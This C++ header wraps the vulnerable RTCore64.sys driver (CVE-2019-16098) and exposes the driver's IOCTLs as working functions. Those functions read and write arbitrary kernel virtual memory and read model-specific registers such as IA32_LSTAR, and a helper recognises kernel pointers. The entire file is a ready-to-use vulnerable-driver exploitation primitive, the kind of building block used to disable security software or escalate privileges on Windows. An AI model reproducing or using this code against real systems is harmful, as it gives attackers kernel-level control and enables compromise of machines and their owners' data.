#pragma once
// RTCore64.sys (CVE-2019-16098) driver wrapper.
// Direct kernel VA read/write via IOCTL.

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <algorithm>
#include <Windows.h>

namespace rtcore {

constexpr const wchar_t* DEVICE_PATH    = L"\\\\.\\RTCore64";
constexpr const char*    SERVICE_NAME   = "RTCore64";
constexpr const char*    DRIVER_FILENAME = "RTCore64.sys";

constexpr uint32_t IOCTL_MSR_READ  = 0x80002030;
constexpr uint32_t IOCTL_MEM_READ  = 0x80002048;
constexpr uint32_t IOCTL_MEM_WRITE = 0x8000204C;

constexpr uint64_t IA32_LSTAR = 0xC0000082;

inline bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

#pragma pack(push, 1)
struct MSRRead {
    uint32_t reg;
    uint32_t value_high;
    uint32_t value_low;
};
static_assert(sizeof(MSRRead) == 12, "MSRRead must be 12 bytes");

struct MemIO {
    uint8_t  pad0[8];
    uint64_t address;
    uint8_t  pad1[8];
    uint32_t size;
    uint32_t value;
    uint8_t  pad2[16];
};
static_assert(sizeof(MemIO) == 48, "MemIO must be 48 bytes");
#pragma pack(pop)

class RTCore {
    HANDLE   dev_      = INVALID_HANDLE_VALUE;

public:
    RTCore() = default;
    ~RTCore() {
        if (dev_ != INVALID_HANDLE_VALUE) CloseHandle(dev_);
    }
    RTCore(const RTCore&) = delete;
    RTCore& operator=(const RTCore&) = delete;

    void open() {
        dev_ = CreateFileW(DEVICE_PATH,
            GENERIC_READ | GENERIC_WRITE, 0,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (dev_ == INVALID_HANDLE_VALUE)
            throw std::runtime_error(
                "open RTCore64 failed, GLE=" + std::to_string(GetLastError()));
    }

    void close() {
        if (dev_ != INVALID_HANDLE_VALUE) {
            CloseHandle(dev_);
            dev_ = INVALID_HANDLE_VALUE;
        }
    }

    // ---- MSR ----
    uint64_t read_msr(uint32_t idx) const {
        MSRRead io{};
        io.reg = idx;
        DWORD ret = 0;
        if (!DeviceIoControl(dev_, IOCTL_MSR_READ,
                &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("read_msr failed");
        return (uint64_t(io.value_high) << 32) | io.value_low;
    }

    // ---- direct VA read (4 bytes) ----
    uint32_t read_u32(uint64_t va) const {
        MemIO io{};
        io.address = va;
        io.size    = 4;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_MEM_READ,
                &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("read_u32 @ 0x" + hex(va) +
                " GLE=" + std::to_string(GetLastError()));
        return io.value;
    }

    uint64_t read_u64(uint64_t va) const {
        uint32_t lo = read_u32(va);
        uint32_t hi = read_u32(va + 4);
        return (uint64_t(hi) << 32) | lo;
    }

    // ---- direct VA write (4 bytes) ----
    void write_u32(uint64_t va, uint32_t val) {
        MemIO io{};
        io.address = va;
        io.size    = 4;
        io.value   = val;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_MEM_WRITE,
                &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("write_u32 @ 0x" + hex(va) +
                " GLE=" + std::to_string(GetLastError()));
    }

    void write_u64(uint64_t va, uint64_t val) {
        write_u32(va,       uint32_t(val & 0xFFFFFFFF));
        write_u32(va + 4,   uint32_t(val >> 32));
    }

    // ---- bulk VA read ----
    void read_va(uint64_t va, void* buf, size_t len) const {
        auto dst = static_cast<uint8_t*>(buf);
        size_t pos = 0;
        while (pos < len) {
            size_t chunk = (std::min)(len - pos, size_t(4));
            uint32_t v   = read_u32(va + pos);
            memcpy(dst + pos, &v, chunk);
            pos += chunk;
        }
    }

    static std::string hex(uint64_t v) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%llX", (unsigned long long)v);
        return buf;
    }
};

} // namespace rtcore
